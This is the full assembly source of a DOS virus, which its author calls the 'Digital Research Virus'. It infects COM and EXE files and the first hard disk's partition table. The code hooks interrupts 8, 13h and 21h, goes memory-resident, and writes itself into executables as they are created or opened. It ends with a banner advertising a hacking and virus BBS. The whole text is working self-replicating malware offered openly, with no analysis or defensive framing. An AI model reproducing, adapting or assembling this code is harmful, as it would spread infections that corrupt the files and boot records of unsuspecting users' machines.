cseg segment public 'code'
	assume	cs:cseg,ds:cseg,es:cseg

;------------------------------------------------------------------------------
; This virus is an com, exe and partitiontable infector. It will become resident
; after the first reboot. The virus is stored above TOM but below 640k.
; When the virus is resident the virus will infect every com and exe-file that
; is created or opend for read and write. The virus doesn't use any stealth
; techniques. The virus doesn't do anything besides replicate. I don't have
; a good name for it, so I named it 'Digital Research Virus'.
;------------------------------------------------------------------------------

SectorCount	equ	(CodeEnd-$+1ffh) shr 9	; Codesize in sectors
MemoryCount	equ	(DataEnd-$+3ffh) shr 10 ; Memory needed in kb

;------------------------------------------------------------------------------
; The first part of a com-file is overwritten by the following code
;------------------------------------------------------------------------------

ComCS		equ	this word+4

ComEntry:
	mov	dx,cs
	add	dx,100h
	push	dx
	mov	dx,offset MainCOM
	push	dx
	retf
	dw	0DEADh

EntrySize	equ	($-ComEntry)
SavedCode	equ	this word		; orginal com-entry code

OldCSIP		equ	this dword		; orginal ip,cs,ss and sp
OldIP		dw	0
OldCS		dw	-10h
OldSS		dw	0
OldSP		dw	400h
		db	EntrySize-8 dup(0)

;------------------------------------------------------------------------------
; The first part of the bootsector is overwritten by the folowing code
;------------------------------------------------------------------------------

BootSector:
	cli					; disable interrupts
	xor	bx,bx				; set ds and ss:sp
	mov	ds,bx
	mov	ss,bx
	mov	sp,7c00h
	sti					; enable interrupts
	mov	ax,ds:[413h]			; get memorysize
	sub	ax,MemoryCount			; adjust memory size
	mov	ds:[413h],ax			; store new memorysize
	mov	cl,6				; calculate segment address
	shl	ax,cl
	mov	es,ax
	push	ax				; store segment and offset
	mov	ax,offset StartUp		; of startup on stack
	push	ax
	mov	ax,200h+SectorCount		; read the virus from disk
	mov	cx,2
	mov	dx,80h
	int	13h
	retf					; jump to startup procedure

BootSize	equ	($-BootSector)

;------------------------------------------------------------------------------
; startup procedure
;------------------------------------------------------------------------------

StartUp:
	cli					; disable interrupts
	mov	ax,offset Interrupt8		; save old interrupt 8 vector
	xchg	ax,ds:[20h]			; and store new vector
	mov	word ptr es:SavedInt8[0],ax
	mov	ax,cs
	xchg	ax,ds:[22h]
	mov	word ptr es:SavedInt8[2],ax
	mov	cs:Count,182
	sti					; enable interrupts
	push	ds				; es=ds
	pop	es
	mov	bx,7c00h
	push	es				; store segment and offset of
	push	bx				; bootsector on stack
	mov	ax,201h				; read bootsector from disk
	mov	cx,1
	mov	dx,80h
	int	13h
	push	cs				; ds=cs
	pop	ds
	mov	si,offset OrginalBoot		; restore first part of
	mov	di,7c00h			; bootsector
	mov	cx,BootSize
	rep	movsb
	push	es				; ds=es
	pop	ds
	retf					; jump to bootsector

;------------------------------------------------------------------------------
; This interrupt will do nothing until it's called for the 182nd time, at that
; moment 10 seconds have past, and the virus will adjust interrupt vector 13h
; and 21h
;------------------------------------------------------------------------------

Count	dw	182

Interrupt8:
	cmp	cs:Count,0			; do nothing if interrupts
	jz	Old8				; are adjusted
	dec	cs:Count			; countdown (10 seconds)
	jnz	Old8
	push	ax				; save registers
	push	ds
	xor	ax,ax				; ds=0 (Interrupt vectors)
	mov	ds,ax
	mov	ax,offset Interrupt21		; save old interrupt vector 21
	xchg	ax,ds:[84h]			; and store new vector
	mov	word ptr cs:SavedInt21[0],ax
	mov	ax,cs
	xchg	ax,ds:[86h]
	mov	word ptr cs:SavedInt21[2],ax
	mov	cs:Handle,0
	pop	ds				; restore registers
	pop	ax
Old8:	jmp	cs:SavedInt8

;------------------------------------------------------------------------------
; This interrupt is installed after 10 seconds, it will then infect every exe
; file that is created or opened to write. It also contains an installation
; check
;------------------------------------------------------------------------------

Interrupt21:
	cmp	ah,30h
	je	Version				; dos version
	cmp	ah,3ch
	je	Open				; create file
	cmp	ax,3d02h
	je	Open				; open for write
	cmp	ah,3eh
	je	Close				; close file
Old21:	jmp	cs:SavedInt21			; do orginal interrupt

Open:	cmp	cs:Handle,0			; other exe-file opnened ?
	jne	Old21				; yes, can't do anything
	call	CheckExe			; check for .exe extension
	jnc	ExeFile
	call	CheckCom
	jnc	ComFile
	jmp	Old21

ComFile:pushf					; execute orginal interrupt
	call	cs:SavedInt21
	jc	Fail				; error opening file
	mov	cs:Handle,ax			; store handle for infection
	mov	cs:Infect,offset InfectCOM	; store infect procedure
	retf	2

ExeFile:pushf					; execute orginal interrupt
	call	cs:SavedInt21
	jc	Fail				; error opening file
	mov	cs:Handle,ax			; store handle for infection
	mov	cs:Infect,offset InfectEXE	; store infect procedure
Fail:	retf	2

Close:	or	bx,bx				; handle 0 ?
	je	Old21				; do orginal interrupt
	cmp	bx,cs:Handle			; handle of exe-file ?
	jne	Old21				; no, do orginal interrupt
	call	cs:Infect			; infect file
	mov	cs:Handle,0
	jmp	Old21				; do orginal interrupt

Version:cmp	dx,0DEADh			; installation check
	jne	Old21				; no, do orginal interrupt
	mov	ax,dx				; ax=dx
	iret					; return to caller

Extension	db	'EXE','COM'

CheckEXE:
	push	bx
	push	es
	push	cs
	pop	es
	mov	bx,offset Extension[0]
	call	Check
	pop	es
	pop	bx
	ret

CheckCOM:
	push	bx
	push	es
	push	cs
	pop	es
	mov	bx,offset Extension[3]
	call	Check
	pop	es
	pop	bx
	ret

Check:	push	ax				; check if extension is .exe
	push	cx				; save registers
	push	si
	push	di
	mov	al,0				; al=0
	mov	cx,100h				; max length is 100h characters
	mov	di,dx				; di=begin of filename
Nxt:	jcxz	Other				; length > 100h characters,
						; must be an other file
	inc	di
	dec	cx
	cmp	byte ptr ds:[di-1],0		; end of filename ?
	je	Last
	cmp	byte ptr ds:[di-1],'.'		; point ?
	jne	Nxt				; no, next character
	mov	si,di				; si=di, si=last point
	mov	al,1				; al=1,  al=1 if point found
	jmp	Nxt				; next character
Last:	or	al,al				; point found ?
	je	Other				; no, it's not an exe-file
	mov	di,bx
	cld
	lodsw					; get 2 bytes after '.'
	and	ax,0dfdfh			; uppercase
	scasw					; compare
	jne	Other
	lodsb					; get 1 byte
	and	al,0dfh				; uppercase
	scasb					; compare
	jne	Other				; no, not an exe-file
	clc					; clear carry, exe-file
	jmp	Done				; return to caller
Other:	stc					; set carry, not an exe-file
Done:	pop	di				; restore registers
	pop	si
	pop	cx
	pop	ax
	ret					; return to caller

;------------------------------------------------------------------------------
; this procedure infects an exe-file that is opened and the handle is in bx
;------------------------------------------------------------------------------

InfectEXE:
	push	ax				; save registers
	push	bx
	push	cx
	push	dx
	push	ds
	push	es
	push	cs				; ds=es=cs
	pop	ds
	push	cs
	pop	es
	mov	ax,4200h			; goto top of file
	xor	cx,cx
	xor	dx,dx
	call	DOS
	mov	ah,3fh				; read exe-header
	mov	cx,1ch
	mov	dx,offset ExeHeader
	call	ReadWrite
	cmp	ChkSum,0DEADh
	call	ReturnEqual
	mov	ChkSum,0DEADh
	mov	ax,ExeIP			; save orginal ip,cs,ss and sp
	mov	OldIP,ax
	mov	ax,ExeCS
	mov	OldCS,ax
	mov	ax,ExeSS
	mov	OldSS,ax
	mov	ax,ExeSP
	mov	OldSP,ax
	mov	ax,PageCount			; calculate new cs and ss
	mov	dx,PartPage
	or	dx,dx
	jz	Zero1
	dec	ax
Zero1:	add	dx,0fh
	mov	cl,4
	shr	dx,cl
	inc	cl
	shl	ax,cl
	add	ax,dx
	mov	dx,ax
	sub	dx,HeaderSize	
	mov	ExeCS,dx			; store new cs,ip,ss and sp
	mov	ExeIP,offset MainEXE
	mov	ExeSS,dx
	mov	ExeSP,offset CodeSize+800h
	mov	dx,10h				; calculate offset in file
	mul	dx
	push	ax				; save offset
	push	dx
	add	ax,offset CodeSize		; calculate new image size
	adc	dx,0
	mov	cx,200h
	div	cx
	or	dx,dx
	je	Zero2
	inc	ax
Zero2:	mov	PageCount,ax
	mov	PartPage,dx
	cmp	MinMem,80h
	jae	MinOk
	mov	MinMem,80h
MinOk:	cmp	MaxMem,80h
	jae	MaxOk
	mov	MaxMem,80h
MaxOk:	pop	cx				; restore offset
	pop	dx
	mov	ax,4200h			; goto found offset
	call	DOS
	mov	ah,40h				; write virus
	mov	cx,offset CodeSize
	xor	dx,dx
	call	ReadWrite
	mov	ax,4200h			; goto top of file
	xor	cx,cx
	xor	dx,dx
	call	DOS
	mov	ah,40h				; write new exe-header
	mov	cx,1ch
	mov	dx,offset ExeHeader
	call	DOS
	jmp	Return
Error:	add	sp,2				; get return address of stack
Return:	pop	es				; restore registers
	pop	ds
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	ret					; return to caller

;------------------------------------------------------------------------------
; jumps to error when z-flag is 1
;------------------------------------------------------------------------------

ReturnEqual:
	je	Error
	ret

;------------------------------------------------------------------------------
; this procedure executes the orginal interrupt 21h, if ax is not equal to cx
; an error occured. This procedure is called from InfectEXE and InfectCOM
;------------------------------------------------------------------------------

ReadWrite:
	pushf
	cli
	call	cs:SavedInt21
	jc	Error
	cmp	ax,cx
	jne	Error
	ret

;------------------------------------------------------------------------------
; this procedure executes the orginal interrupt 21h, and is called from
; InfectEXE and InfectCOM
;------------------------------------------------------------------------------

DOS:	pushf					; call orginal interrupt 21h
	cli
	call	cs:SavedInt21
	jc	Error				; error? yes, jump to error
	ret					; return to caller

;------------------------------------------------------------------------------
; this procedure infects an exe-file that is opened and the handle is in bx
;------------------------------------------------------------------------------

InfectCOM:
	push	ax				; save registers
	push	bx
	push	cx
	push	dx
	push	ds
	push	es
	push	cs				; ds=es=cs
	pop	ds
	push	cs
	pop	es
	mov	ax,4200h			; goto top of file
	xor	cx,cx
	xor	dx,dx
	call	DOS
	mov	ah,3fh				; read first 3 bytes
	mov	cx,EntrySize
	mov	dx,offset SavedCode
	call	ReadWrite
	mov	si,offset SavedCode
	mov	di,offset ComEntry
	mov	cx,EntrySize
	rep	cmpsb
	je	Return
	mov	ax,4202h			; goto end of file
	xor	cx,cx
	xor	dx,dx
	call	DOS
	or	dx,dx
	ja	Error
	cmp	ax,0f000h
	ja	Error
	add	ax,0fh
	mov	cl,4				; prepare the com-entry
	shr	ax,cl
	add	ax,10h
	mov	ComCS,ax
	sub	ax,10h
	shl	ax,cl				; goto end of file
	mov	dx,ax
	mov	ax,4200h
	xor	cx,cx
	call	DOS
	mov	ah,40h				; write virus at the and of the
	mov	cx,offset CodeSize		; com-file
	xor	dx,dx
	call	ReadWrite
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	call	DOS
	mov	ah,40h
	mov	cx,EntrySize
	mov	dx,offset ComEntry
	call	DOS
	jmp	Return

;------------------------------------------------------------------------------
; This procedure infects the master bootsector of the first harddisk. There are
; no registers saved.
;------------------------------------------------------------------------------

InfectBoot:
	mov	ah,30h				; installation check
	mov	dx,0DEADh
	int	21h
	cmp	ax,dx
	je	Infected
	push	cs				; ds=es=cs
	pop	ds
	push	cs
	pop	es
	mov	ax,201h				; read bootsector
	mov	bx,offset OrginalBoot
	mov	cx,1
	mov	dx,80h
	int	13h
	jc	Infected
	mov	si,offset OrginalBoot		; compare bootsector with viral
	mov	di,offset BootSector		; bootsector
	mov	cx,BootSize
	repe	cmpsb
	je	Infected
	mov	ax,300h+SectorCount		; write virus to disk
	xor	bx,bx
	mov	cx,2
	mov	dx,80h
	int	13h
	jc	Infected
	mov	si,offset BootSector		; adjust bootsector
	mov	di,offset OrginalBoot
	mov	cx,BootSize
	rep	movsb
	mov	ax,301h				; write bootsector to disk
	mov	bx,offset OrginalBoot
	mov	cx,1
	mov	dx,80h
	int	13h
Infected:
	ret					; return to caller


;------------------------------------------------------------------------------
; this is the main procedure, when starting up from an com-file, it will
; check if the first harddisk is infected, if not it will infect it.
;------------------------------------------------------------------------------

MainCOM:push	ds
	mov	dx,100h
	push	dx
	push	ax
	push	ds
	push	es
	push	cs
	pop	ds
	mov	si,offset SavedCode
	mov	di,dx
	mov	cx,EntrySize
	rep	movsb
	call	InfectBoot
	pop	es
	pop	ds
	pop	ax
	retf

;------------------------------------------------------------------------------
; this is the main procedure, when starting up from an exe-file, it will
; check if the first harddisk is infected, if not it will infect it.
;------------------------------------------------------------------------------


MainEXE:push	ax				; save registers
	push	ds
	push	es
	mov	ax,ds				; adjust cs and ss
	add	ax,10h
	add	cs:OldCS,ax
	add	cs:OldSS,ax
	call	InfectBoot			; infect the bootsector
	pop	es				; restore registers
	pop	ds
	pop	ax
	mov	ss,cs:OldSS			; set ss:sp
	mov	sp,cs:OldSP
	jmp	cs:OldCSIP			; jump to orginal code

CodeSize	equ	$

;------------------------------------------------------------------------------
; the first part of the orginal bootsector is stored here
;------------------------------------------------------------------------------

OrginalBoot	db	BootSize dup(0)
CodeEnd		equ	$

;------------------------------------------------------------------------------
; the variables used by the virus when its resident are stored here
;------------------------------------------------------------------------------

SavedInt8	dd	0			; orginal interrupt 8
SavedInt21	dd	0			; orginal interrupt 21
Handle		dw	0			; handle of first exe-file
						; opened
Infect		dw	0			; offset infect procedure

Buffer		equ	this byte
ExeHeader	dw	0dh dup(0)		; exe-header is stored here

Signature	equ	ExeHeader[0]		; exe-signature 'MZ'
PartPage	equ	ExeHeader[2]		; size of partitial page
PageCount	equ	ExeHeader[4]		; number of pages (200h bytes)
HeaderSize	equ	ExeHeader[8]		; size of the exe-header
MinMem		equ	ExeHeader[0ah]		; minimum memory needed
MaxMem		equ	ExeHeader[0ch]		; maximum memory needed
ExeSS		equ	ExeHeader[0eh]		; SS
ExeSP		equ	ExeHeader[10h]		; SP
ChkSum		equ	ExeHeader[12h]		; checksum, DEAD if infected
ExeIP		equ	ExeHeader[14h]		; IP
ExeCS		equ	ExeHeader[16h]		; CS

DataEnd		equ	$

cseg ends

sseg segment stack 'stack'
	db	400h dup(?)
sseg ends

end MainEXE

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
